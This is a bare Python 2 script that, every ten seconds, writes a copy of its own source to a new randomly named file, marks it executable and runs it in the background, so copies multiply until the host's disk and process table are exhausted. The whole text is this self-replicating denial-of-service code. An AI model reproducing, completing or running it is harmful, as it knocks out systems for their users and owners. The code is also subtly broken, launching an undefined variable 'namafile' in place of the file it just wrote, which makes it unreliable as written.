#!/usr/bin/python
import os, sys, time, uuid
self_content = file(sys.argv[0]).read()
while True:
    time.sleep(10)
    jeneng = "%s.py" % uuid.uuid4()
    copy = open(jeneng, "w")
    copy.write(self_content)
    copy.close()    
    os.chmod(jeneng, 0755)
    os.system("./%s &" % namafile)
